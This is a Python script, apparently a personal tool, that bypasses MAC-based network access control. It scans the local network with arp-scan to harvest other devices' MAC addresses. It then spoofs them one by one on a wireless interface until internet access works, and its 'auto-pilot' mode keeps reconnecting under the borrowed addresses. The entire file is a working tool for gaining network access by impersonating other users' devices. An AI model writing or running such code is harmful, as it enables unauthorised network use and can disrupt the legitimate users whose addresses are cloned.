#!/usr/bin/env python

import os, sys, time, subprocess
from pythonping import ping
from random import randint

isConnected = False

def scan_mac(mac_table):
    added_count = 0
    stream = os.popen("sudo arp-scan -l -plain")
    data_stream = stream.read().split("\n")
    all_macs = list()
    for data in data_stream:
        if(data==""):
            continue
        data_list = data.split("\t")
        ip_addr = data_list[0]
        mac_addr = data_list[1]
        vendor = data_list[2]
        if(vendor.split(" ")[0]=="Routerboard.com" or vendor.split(" ")[0]=="Cisco"):
            continue
        print("FOUND", mac_addr, "("+vendor+")")
        all_macs.append(mac_addr)
    f = open(mac_table, "r")
    curr_macs = f.readlines()
    f.close()
    for i in range(len(curr_macs)):
            curr_macs[i] = curr_macs[i].strip()
    for mac in all_macs:
        if mac not in curr_macs:
            curr_macs.append(mac)
            added_count+=1
            print("ADDED", mac)
    databse_file = open(mac_table, "w")
    for addr in curr_macs:
        databse_file.writelines(addr+"\n")
    print(added_count, "MAC ADDRESSES ADDED")


def change_mac(interface, new_mac):
    print("[+] Changing MAC address for " + interface + " to " + new_mac)
    subprocess.call(["ifconfig", interface, "down"])
    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
    subprocess.call(["ifconfig", interface, "up"])


def connect(mac_table):
    f = open(mac_table, "r")
    curr_macs = f.readlines()
    f.close()

    mac_count = len(curr_macs)
    try_count = 1

    for mac in curr_macs:
        print("TYRING WITH", mac.strip(), "("+str(try_count)+"/"+str(mac_count)+")")
        change_mac("wlp6s0", mac.strip())
      #  time.sleep(3)
        res = ping("8.8.8.8")
        if(res.success()):
            print("CONNECTED! WITH", mac)
            break
        try_count+=1


def bypass(mac_table, auto_pilot_enabled):
    f = open(mac_table, "r")
    curr_macs = f.readlines()
    f.close()

    mac_count = len(curr_macs)
    try_count = 1

    while True:
        i = randint(0, len(curr_macs)-1)
        print("TYRING WITH", curr_macs[i].strip(), "Attempt", try_count)
        change_mac("wlp6s0", curr_macs[i].strip())
        try:
            res = ping("8.8.8.8")
            if(res.success()):
                print("CONNECTED! WITH", curr_macs[i].strip())
                isConnected = True
                break
        except:
            pass
        try_count+=1
        if(auto_pilot_enabled):
            time.sleep(10)
    if(isConnected):
        if(auto_pilot_enabled):
            print("HANDING OVER CONTROL TO AUTO-PILOT")
            auto_pilot()


def filter(mac_table, auth_table):
    f = open(mac_table, "r")
    curr_macs = f.readlines()
    f.close()
    mac_count = len(curr_macs)
    try_count = 1
    auth_macs = []
    for mac in curr_macs:
        print("TESTING", mac.strip(), "("+str(try_count)+"/"+str(mac_count)+")")
        change_mac("wlp6s0", mac.strip())
      #  time.sleep(3)
        try:
            res = ping("8.8.8.8")
        except:
            pass
        if(res.success()):
            print("AUTHENTICATED MAC FOUND", mac)
            auth_macs.append(mac)
        try_count+=1
    databse_file = open(auth_table, "w")
    for addr in auth_macs:
        databse_file.writelines(addr)
    print(len(auth_macs), "AUTHENTICATED MAC ADDRESSES FOUND")

def auto_pilot():
    print("AUTO-PILOT: Started")
    while True:
        time.sleep(30)
        try:
            res = ping("8.8.8.8")
        except:
            print("AUTO-PILOT: Reconnecting")
            time.sleep(15)
            bypass("auth_macs.txt", True)
        if(not res.success()):
            print("AUTO-PILOT: Reconnecting")
            time.sleep(15)
            bypass("auth_macs.txt", True)


if(len(sys.argv)>1):
            
    if(sys.argv[1]=="scan"):
        mac_table = sys.argv[2]
        scan_mac(mac_table)
    elif(sys.argv[1]=="connect"):
        mac_table = sys.argv[2]
        connect(mac_table)
    elif(sys.argv[1]=="filter"):
        mac_table = sys.argv[2]
        auth_table = sys.argv[3]
        filter(mac_table, auth_table)
    elif(sys.argv[1]=="bypass"):
        auto_pilot_enabled = False
        mac_table = sys.argv[2]
        if(sys.argv.__contains__("--auto-pilot")):
            auto_pilot_enabled = True
        bypass(mac_table, auto_pilot_enabled)